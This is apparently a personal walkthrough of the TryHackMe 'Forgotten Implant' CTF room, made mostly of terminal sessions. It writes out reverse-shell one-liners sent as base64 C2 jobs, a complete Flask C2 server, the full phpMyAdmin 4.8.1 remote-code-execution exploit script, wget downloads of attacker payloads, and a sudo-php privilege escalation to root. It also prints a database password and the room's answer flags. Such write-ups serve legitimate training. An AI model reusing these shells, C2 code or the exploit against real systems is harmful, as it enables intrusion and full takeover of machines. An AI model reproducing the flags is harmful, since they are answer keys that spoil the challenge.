----
With almost no attack surface, you must use a forgotten C2 implant to get initial access.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/1968fc18c7598f797954065d05a7f8f0.png)
### Task 1  Forgotten Implant

 Start Machine

Welcome to Forgotten Implant! 

This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.

If you have no prior knowledge of Command and Control (C2), you might want to look at the [Intro to C2](https://tryhackme.com/room/introtoc2) room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.

Please allow 3-5 minutes for the VM to boot properly!

**Note:** While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.52.181 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Looks like I didn't find any open ports for 10.10.52.181. This is usually caused by a high batch size.
        
*I used 65535 batch size, consider lowering it with 'rustscan -b <batch_size> <ip address>' or a comfortable number for your system.
        
 Alternatively, increase the timeout if your ping is high. Rustscan -t 2000 for 2000 milliseconds (2s) timeout.

https://github.com/andreafabrizi/prism

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo tcpdump -i tun0   
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:05:02.952250 IP 10.10.52.181.39666 > redrules.thm.81: Flags [S], seq 1525617820, win 62727, options [mss 1288,sackOK,TS val 427560044 ecr 0,nop,wscale 7], length 0
14:05:02.953760 IP redrules.thm.81 > 10.10.52.181.39666: Flags [R.], seq 0, ack 1525617821, win 0, length 0
14:05:04.215465 IP 10.10.52.181.39680 > redrules.thm.81: Flags [S], seq 3431912733, win 62727, options [mss 1288,sackOK,TS val 427561253 ecr 0,nop,wscale 7], length 0
14:05:04.218031 IP redrules.thm.81 > 10.10.52.181.39680: Flags [R.], seq 0, ack 3431912734, win 0, length 0

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 81                                       
listening on [any] 81 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 49944
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MTI6MDEuNjE2NTE1IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.8.19.103:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MTI6MDEuNjE2NTE1IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9" | base64 -d
{"time": "2023-08-04T18:12:01.616515", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false} 

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 81  
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.52.181 - - [04/Aug/2023 14:15:03] code 404, message File not found
10.10.52.181 - - [04/Aug/2023 14:15:03] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MTU6MDEuNzMyMzAzIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.52.181 - - [04/Aug/2023 14:15:04] code 404, message File not found
10.10.52.181 - - [04/Aug/2023 14:15:04] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ echo "ImxhdGVzdCI=" | base64 -d
"latest" 

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir get-job                    
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ touch get-job/ImxhdGVzdCI=  
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ echo '{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.8.19.103 4444 >/tmp/f"}' | base64 > get-job/ImxhdGVzdCI=
                                                                                        
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.52.181 - - [04/Aug/2023 14:23:03] code 404, message File not found
10.10.52.181 - - [04/Aug/2023 14:23:03] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6MjM6MDIuMDM3NDI5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.52.181 - - [04/Aug/2023 14:23:05] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.52.181 - - [04/Aug/2023 14:24:05] "GET /job-result/eyJqb2JfaWQiOiAxLCAiY21kIjogInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA0NDQ0ID4vdG1wL2YiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiIn0= HTTP/1.1" 404 -

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJqb2JfaWQiOiAxLCAiY21kIjogInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyA0NDQ0ID4vdG1wL2YiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiIn0=" | base64 -d                                    
{"job_id": 1, "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.8.19.103 4444 >/tmp/f", "success": true, "result": ""}   

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 34966
bash: cannot set terminal process group (1585): Inappropriate ioctl for device
bash: no job control in this shell
ada@forgottenimplant:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null

or from writeup of creator

┌──(witty㉿kali)-[~/Downloads]
└─$ cat c2.py                
import base64
import json
import logging
from pprint import pprint
import queue

from flask import Flask, jsonify, request

# Jobs
jobs = queue.Queue()
jobs.put({'job_id': 'hostname', 'cmd': 'hostname'})
jobs.put({
    'job_id': 'shell', 
    'cmd': 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("10.8.19.103",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\''
    })

app = Flask(__name__)

# Disable Flask Logging
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.disabled = True


def decode_message(message):
    return base64.b64decode(message).decode('utf-8')


def encode_message(message):
    return base64.b64encode(message.encode('utf-8')).decode('utf-8')


@app.route('/heartbeat/<message>')
def heartbeat(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))
    hostname = message['systeminfo']['hostname']

    print(f'💓 Received heartbeat from {host} ({hostname})')

    return 'Received', 200


@app.route('/get-job/<message>')
def get_job(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))

    print(f'➕ Received job request from {host} ({message})')

    try:
        # We are ignoring any other requests (e.g., for a specific job)
        if message == 'latest':
            if jobs.empty():
                print(f'❌ No jobs available')
                return 'No jobs available', 404
            else:
                job = jobs.get()
                print(f'➕ Sending job {job["job_id"]} ({job["cmd"][0:15]}) to {host}')
                return encode_message(json.dumps(job))
        else:
            print(f'❌ No fitting job found ({message})')
    except IndexError:
        print(f'❌ Error sending job {host}')


@app.route('/job-result/<message>')
def job_result(message):
    host = request.remote_addr
    message = json.loads(decode_message(message))

    if message['success'] == True:
        print(f'✅ Received confirmation for job {message["job_id"]} ({message["cmd"][0:15]}) from {host}')
        print(f'\n{message["result"]}\n')
    else:
        print(f'❌ Received error for job {message["job_id"]} ({message["cmd"][0:15]}) from {host}: {message["result"]}')

    return 'Received', 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=81)


┌──(witty㉿kali)-[~/Downloads]
└─$ sudo python3 c2.py
[sudo] password for witty: 
 * Serving Flask app 'c2' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
💓 Received heartbeat from 10.10.52.181 (forgottenimplant)
➕ Received job request from 10.10.52.181 (latest)
➕ Sending job hostname (hostname) to 10.10.52.181
✅ Received confirmation for job hostname (hostname) from 10.10.52.181

forgottenimplant


💓 Received heartbeat from 10.10.52.181 (forgottenimplant)
➕ Received job request from 10.10.52.181 (latest)
➕ Sending job shell (python3 -c 'imp) to 10.10.52.181


┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 45122
ada@forgottenimplant:~$ id
id
uid=1001(ada) gid=1001(ada) groups=1001(ada)

another way

┌──(witty㉿kali)-[~/Downloads]
└─$ cat c2_test.py 
import http.server
import socketserver
import base64

PORT = 81

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        # Data to be encoded in base64
        data = b'{"job_id": 1, "cmd": "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\\"10.8.19.103\\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")\'"}'
        
        # Base64-encode the data
        encoded_data = base64.b64encode(data)

        # Write the base64-encoded data to the response
        self.wfile.write(encoded_data)

with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print("Server listening on port", PORT)
    httpd.serve_forever()

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 c2_test.py
Server listening on port 81
10.10.52.181 - - [04/Aug/2023 14:42:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDRUMTg6NDI6MDEuNjA4NjExIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6ICJob3N0bmFtZSIsICJjbWQiOiAiaG9zdG5hbWUiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiZm9yZ290dGVuaW1wbGFudFxuIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 200 -
10.10.52.181 - - [04/Aug/2023 14:42:04] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.52.181 - - [04/Aug/2023 14:44:04] "GET /job-result/eyJqb2JfaWQiOiAxLCAiY21kIjogInB5dGhvbjMgLWMgJ2ltcG9ydCBvcyxwdHksc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXCIxMC44LjE5LjEwM1wiLDQ0NDQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIiJ9 HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJqb2JfaWQiOiAxLCAiY21kIjogInB5dGhvbjMgLWMgJ2ltcG9ydCBvcyxwdHksc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoXCIxMC44LjE5LjEwM1wiLDQ0NDQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oXCIvYmluL2Jhc2hcIiknIiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIiJ9" | base64 -d
{"job_id": 1, "cmd": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.8.19.103\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", "success": true, "result": ""} 

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.52.181] 59154
ada@forgottenimplant:~$ id
id
uid=1001(ada) gid=1001(ada) groups=1001(ada)

ada@forgottenimplant:~$ cat user.txt
cat user.txt
THM{902e8e8b1f49dfeb678e419935be23ef}
ada@forgottenimplant:~$ cat products.py
cat products.py
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')

ada@forgottenimplant:~$ python3 products.py
python3 products.py
We have 4x Black Shirt
We have 12x Grey Scarf
We have 2x Pink Hat

ada@forgottenimplant:~$ ss -tulpn
ss -tulpn
Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0      0       10.10.52.181%ens5:68           0.0.0.0:*            
tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0      511             127.0.0.1:80           0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*   

ada@forgottenimplant:~$ mysql -h localhost -u app -p
mysql -h localhost -u app -p
Enter password: s4Ucbrme

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.32-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use app;
use app;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------+
| Tables_in_app |
+---------------+
| products      |
+---------------+
1 row in set (0.00 sec)

mysql> select * from products;
select * from products;
+----+-------------+-------+
| id | product     | stock |
+----+-------------+-------+
|  1 | Black Shirt |     4 |
|  2 | Grey Scarf  |    12 |
|  3 | Pink Hat    |     2 |
+----+-------------+-------+
3 rows in set (0.00 sec)

mysql> exit
exit
Bye

ada@forgottenimplant:~$ wget 10.8.19.103/socat
wget 10.8.19.103/socat
--2023-08-04 19:13:32--  http://10.8.19.103/socat
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat               100%[===================>] 366.38K   264KB/s    in 1.4s    

2023-08-04 19:13:33 (264 KB/s) - ‘socat’ saved [375176/375176]

ada@forgottenimplant:~$ chmod +x socat
chmod +x socat
ada@forgottenimplant:~$ ./socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80 
./socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.52.181 - - [04/Aug/2023 15:13:33] "GET /socat HTTP/1.1" 200

http://10.10.52.181:8080/

view-source:http://10.10.52.181:8080/

href="js/vendor/codemirror/addon/lint/lint.css?v=4.8.1"

or after logging   Version information: 4.8.1

ada@forgottenimplant:~$ ss -tulpn
ss -tulpn
Netid  State   Recv-Q  Send-Q        Local Address:Port      Peer Address:Port  Process                                                                         
udp    UNCONN  0       0             127.0.0.53%lo:53             0.0.0.0:*                                                                                     
udp    UNCONN  0       0         10.10.52.181%ens5:68             0.0.0.0:*                                                                                     
tcp    LISTEN  0       70                127.0.0.1:33060          0.0.0.0:*                                                                                     
tcp    LISTEN  0       151               127.0.0.1:3306           0.0.0.0:*                                                                                     
tcp    LISTEN  0       5                   0.0.0.0:8080           0.0.0.0:*      users:(("socat",pid=2184,fd=5))                                                
tcp    LISTEN  0       511               127.0.0.1:80             0.0.0.0:*                                                                                     
tcp    LISTEN  0       4096          127.0.0.53%lo:53             0.0.0.0:* 

ada@forgottenimplant:~$ curl http://127.0.0.1 | grep '<title>.*</title>'
curl http://127.0.0.1 | grep '<title>.*</title>'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9480    0  9480    0     0  1851k      0 --:--:-- --:--:-- --:--:-- 1851k
<!DOCTYPE HTML><html lang='en' dir='ltr'><head><meta charset="utf-8" /><meta name="referrer" content="no-referrer" /><meta name="robots" content="noindex,nofollow" /><meta http-equiv="X-UA-Compatible" content="IE=Edge" /><meta name="viewport" content="width=device-width, initial-scale=1.0"><style id="cfs-style">html{display: none;}</style><link rel="icon" href="favicon.ico" type="image/x-icon" /><link rel="shortcut icon" href="favicon.ico" type="image/x-icon" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/jquery/jquery-ui.css" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/lib/codemirror.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/addon/hint/show-hint.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="js/vendor/codemirror/addon/lint/lint.css?v=4.8.1" /><link rel="stylesheet" type="text/css" href="phpmyadmin.css.php?nocache=4712093054ltr&amp;server=1" /><link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.8.1" media="print" id="printcss"/><title>phpMyAdmin</title><script data-cfasync="false" type="text/javascript" src="js/vendor/jquery/jquery.min.js?v=4.8.1"></script>

ada@forgottenimplant:~$ cat /var/www/phpmyadmin/README | head
cat /var/www/phpmyadmin/README | head
phpMyAdmin - Readme
===================

Version 4.8.1

A web interface for MySQL and MariaDB.

https://www.phpmyadmin.net/

Summary

https://www.exploit-db.com/exploits/50457

┌──(witty㉿kali)-[~/Downloads]
└─$ cat phpmyadmin4_8_1_rce.py 
# Exploit Title: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
# Date: 17/08/2021
# Exploit Author: samguy
# Vulnerability Discovery By: ChaMd5 & Henry Huang
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.1
# Tested on: Linux - Debian Buster (PHP 7.3)
# CVE : CVE-2018-12613

#!/usr/bin/env python

import re, requests, sys

# check python major version
if sys.version_info.major == 3:
  import html
else:
  from six.moves.html_parser import HTMLParser
  html = HTMLParser()

if len(sys.argv) < 7:
  usage = """Usage: {} [ipaddr] [port] [path] [username] [password] [command]
Example: {} 192.168.56.65 8080 /phpmyadmin username password whoami"""
  print(usage.format(sys.argv[0],sys.argv[0]))
  exit()

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

# 1st req: check login page and version
url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')
if r.status_code != 200:
  print("Unable to find the version")
  exit()

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)
if version != "4.8.0" and version != "4.8.1":
  print("The target is not exploitable".format(version))
  exit()

# get 1st token and cookie
cookies = r.cookies
token = get_token(content)

# 2nd req: login
p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)
if logged_in == "false":
  print("Authentication failed")
  exit()

# get 2nd token and cookie
cookies = r.cookies
token = get_token(content)

# 3rd req: execute query
url2 = url + "/import.php"
# payload
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)
if r.status_code != 200:
  print("Query failed")
  exit()

# 4th req: execute payload
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)
if r.status_code != 200:
  print("Exploit failed")
  exit()

# get result
content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))

ada@forgottenimplant:~$ wget 10.8.19.103/phpmyadmin4_8_1_rce.py
wget 10.8.19.103/phpmyadmin4_8_1_rce.py
--2023-08-04 19:26:12--  http://10.8.19.103/phpmyadmin4_8_1_rce.py
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2706 (2.6K) [text/x-python]
Saving to: ‘phpmyadmin4_8_1_rce.py’

phpmyadmin4_8_1_rce 100%[===================>]   2.64K  --.-KB/s    in 0s      

2023-08-04 19:26:12 (247 MB/s) - ‘phpmyadmin4_8_1_rce.py’ saved [2706/2706]

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.52.181 - - [04/Aug/2023 15:26:13] "GET /phpmyadmin4_8_1_rce.py HTTP/1.1" 200 -

ada@forgottenimplant:~$ python3 phpmyadmin4_8_1_rce.py 127.0.0.1 80 / app s4Ucbrme 'whoami'
<in4_8_1_rce.py 127.0.0.1 80 / app s4Ucbrme 'whoami'
www-data

ada@forgottenimplant:~$ python3 phpmyadmin4_8_1_rce.py 127.0.0.1 80 / app s4Ucbrme 'sudo -l'
<n4_8_1_rce.py 127.0.0.1 80 / app s4Ucbrme 'sudo -l'
Matching Defaults entries for www-data on forgottenimplant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on forgottenimplant:
    (root) NOPASSWD: /usr/bin/php

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php        
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?> 

ada@forgottenimplant:~$ wget 10.8.19.103/payload_ivan.php
wget 10.8.19.103/payload_ivan.php
--2023-08-05 00:11:09--  http://10.8.19.103/payload_ivan.php
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9284 (9.1K) [application/octet-stream]
Saving to: ‘payload_ivan.php’

payload_ivan.php    100%[===================>]   9.07K  --.-KB/s    in 0s      

2023-08-05 00:11:09 (179 MB/s) - ‘payload_ivan.php’ saved [9284/9284]

ada@forgottenimplant:~$ python3 phpmyadmin4_8_1_rce.py 127.0.0.1 80 / app s4Ucbrme "sudo /usr/bin/php /home/ada/payload_ivan.php"
<brme "sudo /usr/bin/php /home/ada/payload_ivan.php"

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.126.2] 48004
SOCKET: Shell has connected! PID: 1319
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
root@forgottenimplant:/var/www/phpmyadmin# cd /root
cd /root
root@forgottenimplant:~# ls
ls
snap
root@forgottenimplant:~# ls -lah
ls -lah
total 44K
drwx------  6 root root 4.0K Mar 13 22:34 .
drwxr-xr-x 18 root root 4.0K Apr 12 20:47 ..
lrwxrwxrwx  1 root root    9 Mar 13 22:33 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4.0K Jul 12  2022 .composer
drwxr-xr-x  3 root root 4.0K Jul 11  2022 .local
-rw-------  1 root root  800 Jul 12  2022 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Mar 13 22:34 .python_history -> /dev/null
-rw-r--r--  1 root root   38 Jul 12  2022 .root.txt
-rw-r--r--  1 root root   66 Jul 12  2022 .selected_editor
drwx------  2 root root 4.0K Jul 10  2022 .ssh
drwx------  3 root root 4.0K Jul 10  2022 snap
root@forgottenimplant:~# cat .root.txt
cat .root.txt
THM{7762118e4a93b277cb2fb221745d2cf1}


```

What is the user flag?

Your port scan is not misleading you.

*THM{902e8e8b1f49dfeb678e419935be23ef}*

What is the root flag?

*THM{7762118e4a93b277cb2fb221745d2cf1}*

[[ret2libc]]